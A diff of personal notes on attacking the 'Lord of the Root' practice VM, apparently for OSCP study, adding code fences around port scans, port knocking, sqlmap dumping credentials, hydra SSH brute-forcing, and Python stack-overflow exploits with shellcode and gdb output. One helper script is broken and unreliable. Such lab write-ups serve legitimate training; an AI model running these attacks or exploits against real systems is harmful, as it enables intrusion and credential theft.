@@ -1,7 +1,7 @@
 https://kooksec.blogspot.com/2015/09/hacking-lord-of-root.html
 
 
-
+```console
 └─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.36
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 11:32 CEST
@@ -30,7 +30,9 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 106.84 seconds
-                                                                                                                                                             
+```
+
+```console
 ┌──(kali㉿kali)-[~/OSCP/boxes/lord]
 └─$ ssh 192.168.110.36                   
 The authenticity of host '192.168.110.36 (192.168.110.36)' can't be established.
@@ -53,10 +55,17 @@ Warning: Permanently added '192.168.110.36' (ECDSA) to the list of known hosts.
 Easy as 1,2,3
 bttai@192.168.110.36's password: 
 
+```
 
+
+```bash
 
 for x in 1 2 3; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.110.36; done
 
+```
+
+
+```console
 └─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.36                         
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 11:42 CEST
@@ -88,7 +97,9 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 117.90 seconds
+```
 
+```console
 
 ┌──(kali㉿kali)-[~/OSCP/boxes/lord]
 └─$ curl http://192.168.110.36:1337/404.html
@@ -104,7 +115,9 @@ Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
 └─$ echo Lzk3ODM0NTIxMC9pbmRleC5waHA= | base64 -d                    
 /978345210/index.php 
 
+```
 
+```console
 
 └─$ sqlmap -u 'http://192.168.110.36:1337/978345210/index.php' --forms --dbms=Mysql --risk=3 --level=5 --threads=4 --batch  --dbs
 [15:57:41] [INFO] retrieved: performance_schema
@@ -126,6 +139,11 @@ available databases [4]:
 | 4  | AndMyBow         | legolas  |
 | 5  | AndMyAxe         | gimli    |
 +----+------------------+----------+
+```
+
+
+
+```console
 
 └─$ hydra -L users.txt -P passwords.txt ssh://192.168.110.36               
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -137,15 +155,23 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-05 16:15:
 [22][ssh] host: 192.168.110.36   login: smeagol   password: MyPreciousR00t
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-05 16:15:14
+```
+
+
+```console
 
 smeagol@LordOfTheRoot:~$ find / -perm -u=s -type f 2>/dev/null
 /SECRET/door2/file
 /SECRET/door1/file
 /SECRET/door3/file
 
+```
 
 
-smeagol@LordOfTheRoot:~$ cat exploit.py 
+```python
+
+# cat exploit.py 
+
 import struct
 
 def p(x):
@@ -170,10 +196,35 @@ buf += sc
 
 print buf
 
+```
 
 
 
 
+```bash
+
+smeagol@LordOfTheRoot:~$ for a in {1..1000};do /SECRET/door2/file $(python exploit.py); done
+
+```
+
+
+```python
+import os, sys
+
+
+files = ["file1", "file2", "file3"]
+
+while True:
+    fileSize[]
+    for f in files:
+        fileSize.apped(os.path.getsize(f))
+    index = fileSize.index(min(fileSize))
+    os.system(files[index] + " " + exploit)
+    #os.system("gdb --args " + files[index] + " " + exploit)
+
+```
+
+```c
 # cat buf.c
 #include <string.h>
 #include <stdio.h>
@@ -191,7 +242,9 @@ int main(int argc, char *argv[]){
   return 0;
 
 }
+```
 
+```c
 # cat other.c
 #include <string.h>
 #include <stdio.h>
@@ -209,8 +262,7 @@ int main(int argc, char *argv[]){
   return 0;
 
 }
-
-smeagol@LordOfTheRoot:~$ for a in {1..1000};do /SECRET/door2/file $(python exploit.py); done
+```
 
 
 
@@ -253,8 +305,11 @@ int main(int argc, char ** argv) {
 // Detected compiler/packer: gcc (4.8.4)
 // Detected functions: 1
 
+
 ```
 
+
+```console
 
 gdb-peda$ checksec 
 CANARY    : disabled
@@ -317,12 +372,15 @@ Start      End        Perm      Name
 0xb773f000 0xb7740000 rwxp      /lib/i386-linux-gnu/ld-2.19.so
 0xbf980000 0xbf9a1000 rwxp      [stack]
 
-
+```
 
 ===
 
 
 http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/
+
+
+```console
 
 Dump of assembler code for function main:
    0x0804845d <+0>:     push   ebp
@@ -361,6 +419,10 @@ gdb-peda$ x/16wx _start
 0x8048370 <_start+16>:  0x0484b068      0x68565108      0x0804845d      0xffffcfe8
 0x8048380 <_start+32>:  0x9066f4ff      0x90669066      0x90669066      0x90669066
 
+```
+
+
+```python
 
 
 import struct
@@ -385,6 +447,8 @@ sc += "\x80\x31\xc0\xb0\x01\xcd\x80"
 
 mem = 0x08049040
 
+
+# e4ff
 # x/16wx _start
 buf += write(0x8048380, mem)    # 0x8048380 0x9066f4ff
 #buf += write(0x8048366, mem+1) # 0x8048366 <_start+6>:   0x5450f0e4
@@ -395,3 +459,6 @@ buf += p(mem)
 buf += sc
 print buf
 
+
+
+```
